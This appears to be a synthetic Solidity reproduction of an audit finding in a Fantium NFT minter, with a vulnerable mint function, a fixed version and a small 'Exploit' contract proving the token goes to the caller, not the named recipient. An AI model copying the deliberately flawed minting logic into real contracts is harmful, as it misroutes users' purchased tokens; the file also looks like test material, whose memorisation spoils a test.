// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Fantium FantiumMinterV1.mint — the NFT is minted to msg.sender, not _to
    (MixBytes, AuditVault 28050). January 2023 report.
    SYNTHETIC, cheatcode-free. The audited example:
      fan.mint(athlete, 1, {value: 100000000000000})
      ownerOf(1000000) is the fan, not the athlete.
    The fix is fantiumNFTContract.mintTo(_to, thisTokenId). */

contract FantiumNFT {
    mapping(uint256 => address) public ownerOf;
    mapping(address => uint256) public balanceOf;

    function mintTo(address to, uint256 tokenId) external {
        require(ownerOf[tokenId] == address(0), "exists");
        ownerOf[tokenId] = to;
        balanceOf[to] += 1;
    }
}

contract FantiumMinterV1 {
    uint256 public constant PRICE = 100000000000000;
    FantiumNFT public fantiumNFTContract;
    address public constant PROCEEDS = address(0xCAFE);

    constructor(FantiumNFT nft) {
        fantiumNFTContract = nft;
    }

    function mint(address _to, uint256 collectionId) external payable {
        require(msg.value == PRICE, "price");
        require(_to != address(0), "to");
        uint256 thisTokenId = collectionId * 1_000_000;
        // @> VULN: the final mint is for msg.sender, not _to.
        fantiumNFTContract.mintTo(msg.sender, thisTokenId);
        (bool ok,) = PROCEEDS.call{value: msg.value}("");
        require(ok, "pay");
    }

    function mintFixed(address _to, uint256 collectionId) external payable {
        require(msg.value == PRICE, "price");
        uint256 thisTokenId = collectionId * 1_000_000;
        fantiumNFTContract.mintTo(_to, thisTokenId);
        (bool ok,) = PROCEEDS.call{value: msg.value}("");
        require(ok, "pay");
    }
}

contract Exploit {
    address public constant ATHLETE = address(0x90F79bf6EB2c4f870365E785982E1f101E93b906);
    uint256 public constant TOKEN_ID = 1000000;
    uint256 public constant PRICE = 100000000000000;

    FantiumNFT public nft;
    FantiumMinterV1 public minter;

    constructor() {
        nft = new FantiumNFT();
        minter = new FantiumMinterV1(nft);
    }

    receive() external payable {}

    function run() external payable {
        require(msg.value == PRICE, "price");
        minter.mint{value: PRICE}(ATHLETE, 1);
        require(nft.ownerOf(TOKEN_ID) == address(this), "fan owns it");
        require(nft.balanceOf(ATHLETE) == 0, "athlete has 0");
        require(nft.balanceOf(address(this)) == 1, "fan has 1");
    }
}
